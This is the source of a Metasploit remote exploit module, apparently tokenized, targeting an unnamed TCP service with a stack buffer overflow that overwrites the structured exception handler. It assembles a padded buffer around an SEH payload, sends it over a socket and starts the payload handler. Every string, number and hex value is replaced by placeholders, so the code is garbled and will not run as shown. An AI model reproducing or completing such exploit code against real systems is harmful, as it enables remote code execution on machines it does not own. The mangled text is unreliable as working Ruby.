require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: Remote :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <int> , <str> = > <hex> , } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def exploit data = [ <hex> ] . pack ( <str> ) data << [ <hex> ] . pack ( <str> ) data << [ <hex> ] . pack ( <str> ) data << <str> data << rand_text_alpha_upper ( target [ <str> ] ) data << generate_seh_payload ( target . ret ) data << rand_text_alpha_upper ( <int> - payload . encoded . length ) data << [ <hex> ] . pack ( <str> ) data << [ <hex> ] . pack ( <str> ) data << [ <hex> ] . pack ( <str> ) connect print_status ( <str> target . name <str> ) sock . put ( data ) select ( nil , nil , nil , <int> . <int> ) handler disconnect end end 
